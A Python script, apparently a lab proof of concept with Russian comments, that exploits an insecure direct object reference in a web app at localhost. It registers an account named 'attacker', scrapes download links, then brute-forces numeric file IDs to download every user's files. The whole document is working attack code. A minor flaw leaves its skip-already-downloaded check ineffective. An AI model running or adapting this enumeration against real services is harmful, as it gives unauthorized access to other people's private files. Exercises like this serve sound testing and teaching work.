import requests
import os
import re
from bs4 import BeautifulSoup

BASE_URL = 'http://localhost:5000'
DOWNLOAD_DIR = 'downloaded_files'
MAX_ID = 10  # Максимальный ID для перебора (можно увеличить)

# Создаем сессию
session = requests.Session()

print("=== Получение всех файлов от пользователей для скачивании ===")

# Шаг 1: Проверка доступа без авторизации
print("[*] Проверка доступа без авторизации:")
r = session.get(f'{BASE_URL}/files')
print(f"  > Статус-код /files: {r.status_code}")  # Ожидаем 401 или редирект

# Шаг 2: Регистрация и вход
username = 'attacker'
password = '123456'

print("[*] Регистрируемся и входим под пользователем:")
session.post(f'{BASE_URL}/register', data={'username': username, 'password': password})
session.post(f'{BASE_URL}/login', data={'username': username, 'password': password})

# Шаг 3: Получаем file_id из HTML (если есть)
print("[*] Получаем ID файлов со страницы /files:")
files_page = session.get(f'{BASE_URL}/files')
soup = BeautifulSoup(files_page.text, 'html.parser')
file_ids = set()
for a in soup.find_all('a', href=True):
    match = re.search(r'/download/(\d+)', a['href'])
    if match:
        file_ids.add(int(match.group(1)))

print(f"  > Найдено ссылок на скачивание: {len(file_ids)}")

# Шаг 4: Брутфорс ID (от 1 до MAX_ID)
print(f"[*] Начинаем перебор ID от 1 до {MAX_ID}...")
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
downloaded = set()

for file_id in range(1, MAX_ID + 1):
    if file_id in downloaded:
        continue  # Уже скачан с /files

    file_url = f'{BASE_URL}/download/{file_id}'
    r = session.get(file_url)

    if r.status_code == 200:
        content_disp = r.headers.get('Content-Disposition')
        filename = re.findall('filename="?([^"]+)"?', content_disp)[0] if content_disp else f'{file_id}.bin'
        filepath = os.path.join(DOWNLOAD_DIR, filename)
        
        with open(filepath, 'wb') as f:
            f.write(r.content)
        
        print(f"  [+] Скачан файл ID {file_id}: {filename}")
        downloaded.add(file_id)
    else:
        print(f"  [-] ID {file_id} недоступен (статус: {r.status_code})")

print("[>] Загрузка завершена.")
print(f"[>] Файлы сохранены в папке: {DOWNLOAD_DIR}")

